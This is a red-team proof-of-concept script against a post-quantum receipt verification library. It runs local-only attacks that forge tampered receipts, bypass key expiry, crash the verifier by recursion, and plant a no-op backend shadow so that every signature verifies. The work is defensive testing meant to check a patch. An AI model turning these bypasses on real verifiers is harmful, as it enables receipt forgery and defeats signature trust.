"""Proofs of concept against fractalai_pqc_verify 0.1.0 (offline; local servers only, no production).

Each poc_* prints ATTACK-WORKS / blocked. Run before and after the patch:
    python redteam/poc.py
"""
from __future__ import annotations

import copy
import hashlib
import http.server
import json
import os
import ssl
import subprocess
import sys
import tempfile
import threading
from pathlib import Path

from fractalai_pqc_verify import load_key_directory, verify_receipt
from fractalai_pqc_verify import mldsa
from fractalai_pqc_verify.profiles import verify_profile

HERE = Path(__file__).resolve().parent
FIX = HERE.parent / "python" / "tests" / "fixtures"
REC = json.loads((FIX / "midas-alert-fe62b072.json").read_text())
DIR = json.loads((FIX / "x402-receipt-keys-epoch3.json").read_text())
GOV = DIR["directory_public_key"]
ACTIVE = [k["public_key_b64"] for k in DIR["keys"] if k["status"] == "active"]
VEC = {p.stem: json.loads(p.read_text()) for p in (HERE.parent / "conformance" / "vectors").glob("*.json")}

results = []


def report(name, works, detail=""):
    results.append((name, works))
    print(f"[{'ATTACK-WORKS' if works else 'blocked     '}] {name}  {detail}")


def poc_profile_dispatch_bypass():
    """F1: a TAMPERED MIDAS alert (facts/canonical/snapshot rewritten) is VALID once the attacker adds
    `profile: "x402-served"` + the generic fields: verify_receipt dispatches on the attacker-chosen
    profile and skips receipt_id==sha256(canonical) and the facts check."""
    r = copy.deepcopy(REC)
    r["facts"]["health_factor"] = 0.42
    r["facts"]["debt_usd"] = 99_999_999
    r["canonical"] = r["canonical"].replace("health_factor=1.000872452215302", "health_factor=0.42")
    r.update({"profile": "x402-served", "domain": "FRACTALAI-x402-served-v1", "route_id": "midas-alert",
              "digest": r["receipt_id"], "signed_message": r["served_message"]})
    res = verify_receipt(r, ACTIVE)
    report("F1 profile-dispatch bypass (tampered MIDAS alert)", res.valid, f"valid={res.valid} reason={res.reason[:60]!r}")


def poc_other_route_as_midas():
    """F1b: verify_receipt(..., expected_route='midas-alert') accepts an x402-served entry signed for
    ANOTHER route by the same trusted key (expected_route is ignored on the profile path)."""
    v = VEC["x402-served"]["valid"]  # route_id = verify-agent
    res = verify_receipt(v, [VEC["x402-served"]["trusted_public_key"]], expected_route="midas-alert")
    report("F1b expected_route ignored for profile entries", res.valid, f"route_id={v['route_id']} valid={res.valid}")


def poc_unsigned_snapshot_and_extra_facts():
    """F2: `snapshot` (committed by the SIGNED snapshot_hash) is never checked, and `facts` keys that are
    not in the signed canonical are accepted -> an agent reads attacker data from a VALID receipt."""
    r = copy.deepcopy(REC)
    r["snapshot"]["row"]["health_factor"] = 0.5
    r["snapshot"]["row"]["debt_usd"] = 1
    r["facts"]["recommended_action"] = "liquidate-now"
    res = verify_receipt(r, ACTIVE)
    report("F2 unsigned snapshot / extra facts accepted", res.valid, f"valid={res.valid}")


def poc_b64url_trailing_newline():
    """F3: strict_b64url's regex uses `$` (matches before a trailing \\n) and urlsafe_b64decode does not
    validate -> a JWS whose signature has a trailing newline is VALID in Python, rejected by Node."""
    v = copy.deepcopy(VEC["jose-ml-dsa-65"]["valid"])
    v["jws"] += "\n"
    res = verify_profile("jose-ml-dsa-65", v, [VEC["jose-ml-dsa-65"]["trusted_public_key"]])
    report("F3 base64url trailing-newline malleability (JWS)", res.valid, f"valid={res.valid}")


def poc_nonjson_constants():
    """F4: json.loads accepts NaN/Infinity (not JSON, RFC 8259) -> Python VALID, Node: parse error."""
    text = json.dumps(REC)[:-1] + ', "x_note": NaN}'
    res = verify_receipt(text, ACTIVE)
    report("F4 NaN/Infinity tokens accepted in receipt text", res.valid, f"valid={res.valid}")


def poc_recursion_crash():
    """F7: verify_receipt() raises RecursionError instead of returning INVALID (deep `facts` value, or
    deep JSON text) -> uncaught exception in an agent tool loop (DoS) / CLI traceback."""
    r = copy.deepcopy(REC)
    deep = 0
    for _ in range(5000):
        deep = [deep]
    r["facts"]["chain_id"] = deep
    crashed = False
    try:
        verify_receipt(r, ACTIVE)
    except RecursionError:
        crashed = True
    text = '{"canonical":' + "[" * 100000 + "]" * 100000 + "}"
    try:
        verify_receipt(text, ACTIVE)
    except RecursionError:
        crashed = True
    report("F7 RecursionError escapes verify_receipt", crashed)


def poc_retiring_unsigned_emitted_at():
    """F8: `fractalai-verify receipt --include-retiring` takes `now` from the receipt's UNSIGNED top-level
    `emitted_at` -> an attacker resets it to 0 to keep a retiring key trusted after its not_after.
    Simulated: a directory where the retiring key expired long ago (not_after=1)."""
    from fractalai_pqc_verify import cli
    d = load_key_directory(DIR, governance_key=GOV)
    expired = [dict(k) for k in d.keys]
    for k in expired:
        if k["status"] == "retiring":
            k["not_after"] = "1"
            retiring_pk = k["public_key_b64"]

    class FakeDir:
        def trusted_keys(self, include_retiring=False, now=None):
            import time
            now = int(time.time()) if now is None else now
            return [k["public_key_b64"] for k in expired if k["status"] == "active" or (include_retiring and k["status"] == "retiring" and now <= int(k["not_after"]))]

    forged = {"emitted_at": "0"}
    now = cli._emitted_at(forged)
    works = retiring_pk in FakeDir().trusted_keys(include_retiring=True, now=now)
    report("F8 --include-retiring trusts unsigned emitted_at", works, f"now taken from receipt = {now!r}")


def poc_not_after_garbage():
    """F8b: a retiring key whose not_after is unparsable ('soon', '', 'None') is trusted FOREVER."""
    raw = copy.deepcopy(DIR)
    d = load_key_directory(raw, governance_key=GOV)
    from fractalai_pqc_verify.directory import KeyDirectory
    keys = [dict(k) for k in d.keys]
    for k in keys:
        if k["status"] == "retiring":
            k["not_after"] = "soon"
            rk = k["public_key_b64"]
    fake = KeyDirectory(raw={**raw, "keys": keys}, source="x", trust_basis="t", verification=d.verification)
    report("F8b unparsable not_after = never expires", rk in fake.trusted_keys(include_retiring=True, now=10**12))


def poc_backend_stub_hijack():
    """F9: a backend that signals success by *returning None* is accepted. Any importable `pqcrypto`
    shadow (CWD on sys.path, a typosquat, a broken build) whose verify() is a no-op makes EVERY
    signature verify; `auto` silently prefers it over dilithium-py and there is no self-test."""
    with tempfile.TemporaryDirectory() as td:
        pkg = Path(td) / "pqcrypto" / "sign"
        pkg.mkdir(parents=True)
        (Path(td) / "pqcrypto" / "__init__.py").write_text("")
        (pkg / "__init__.py").write_text("")
        (pkg / "ml_dsa_65.py").write_text("def verify(pk, m, s):\n    return None\n")
        code = (
            "import sys,json; sys.path.insert(0, %r)\n"
            "from fractalai_pqc_verify import verify_receipt\n"
            "r=json.load(open(%r)); r['signature']='AAAA'+r['signature'][4:]\n"
            "res=verify_receipt(r, [r['public_key']]); print(res.valid)\n" % (td, str(FIX / "midas-alert-fe62b072.json"))
        )
        env = {k: v for k, v in os.environ.items() if k != "FRACTALAI_PQC_BACKEND"}
        out = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, env=env)
        report("F9 no-op backend shadow accepted (auto)", out.stdout.strip() == "True", out.stdout.strip() or out.stderr.strip()[-120:])


def poc_backend_env_crash():
    """F9b: FRACTALAI_PQC_BACKEND=pqcrypto when it is not importable -> ImportError escapes verify_receipt
    (the served path only catches ValueError); an unknown name is mis-reported as an encoding error."""
    code = (
        "import json,sys; sys.modules['pqcrypto']=None\n"
        "from fractalai_pqc_verify import verify_receipt\n"
        "r=json.load(open(%r))\n"
        "try:\n  print(verify_receipt(r,[r['public_key']]).reason)\nexcept ImportError as e: print('CRASH ImportError')\n" % str(FIX / "midas-alert-fe62b072.json")
    )
    out = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, env={**os.environ, "FRACTALAI_PQC_BACKEND": "pqcrypto"})
    report("F9b backend env -> uncaught ImportError", "CRASH" in out.stdout, out.stdout.strip()[:80])


def _tls_server(handler_cls):
    certdir = tempfile.mkdtemp()
    crt, key = f"{certdir}/c.pem", f"{certdir}/k.pem"
    subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", key, "-out", crt, "-days", "1",
                    "-subj", "/CN=127.0.0.1", "-addext", "subjectAltName=IP:127.0.0.1"], check=True, capture_output=True)
    srv = http.server.HTTPServer(("127.0.0.1", 0), handler_cls)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(crt, key)
    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, crt


def poc_https_to_http_redirect():
    """F6: fetch_key_directory() follows a redirect from https:// to plain http:// (urllib default) and
    still reports trust_basis='tls'. Also no size cap on the body. Local servers only."""
    from fractalai_pqc_verify import fetch_key_directory
    body = json.dumps(DIR).encode()

    class Plain(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200); self.send_header("Content-Type", "text/html"); self.end_headers(); self.wfile.write(body)
        def log_message(self, *a): pass

    plain = http.server.HTTPServer(("127.0.0.1", 0), Plain)
    threading.Thread(target=plain.serve_forever, daemon=True).start()

    class Redir(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(302); self.send_header("Location", f"http://127.0.0.1:{plain.server_port}/keys"); self.end_headers()
        def log_message(self, *a): pass

    srv, crt = _tls_server(Redir)
    old = ssl._create_default_https_context
    ssl._create_default_https_context = lambda *a, **k: ssl.create_default_context(cafile=crt)
    import urllib.request
    urllib.request._opener = None
    try:
        d = fetch_key_directory(f"https://127.0.0.1:{srv.server_port}/.well-known/x402-receipt-keys")
        report("F6 https->http redirect followed, trust_basis still 'tls'", True, f"trust_basis={d.trust_basis} source={d.source}")
    except Exception as e:
        report("F6 https->http redirect followed, trust_basis still 'tls'", False, f"{type(e).__name__}: {str(e)[:80]}")
    finally:
        ssl._create_default_https_context = old
        srv.shutdown(); plain.shutdown()


def poc_directory_raw_mutable():
    """F10: KeyDirectory keeps a reference to the caller's dict; mutating it AFTER verification changes the
    trusted set (TOCTOU for long-lived agents that cache the dict)."""
    raw = copy.deepcopy(DIR)
    d = load_key_directory(raw, governance_key=GOV)
    raw["keys"].append({"public_key_b64": "ATTACKER", "status": "active", "kid": "x"})
    report("F10 KeyDirectory.raw mutable after verification", "ATTACKER" in d.trusted_keys())


def poc_dir_keys_null():
    """F11 (differential, low): `keys: null|""|0|false` is treated as [] (root computed over []), Node throws."""
    from fractalai_pqc_verify.directory import directory_root, verify_directory
    from pqcrypto.sign import ml_dsa_65 as pq
    import base64
    pk, sk = pq.keygen()
    pkb = base64.b64encode(pk).decode()
    root = directory_root([], None, 1, pkb)
    sm = f"FRACTALAI-key-directory-v1\n{root}"
    d = {"spec": "FRACTALAI-key-directory-v1", "epoch": 1, "keys": None, "root": root, "signed_message": sm,
         "signature": base64.b64encode(pq.sign(sk, sm.encode())).decode(), "directory_public_key": pkb}
    report("F11 directory keys:null accepted (Node rejects)", verify_directory(d, governance_key=pkb).valid)


if __name__ == "__main__":
    for name, fn in list(globals().items()):
        if name.startswith("poc_"):
            try:
                fn()
            except Exception as e:
                print(f"[error       ] {name}: {type(e).__name__}: {e}")
    print(f"\n{sum(w for _, w in results)}/{len(results)} attacks work")
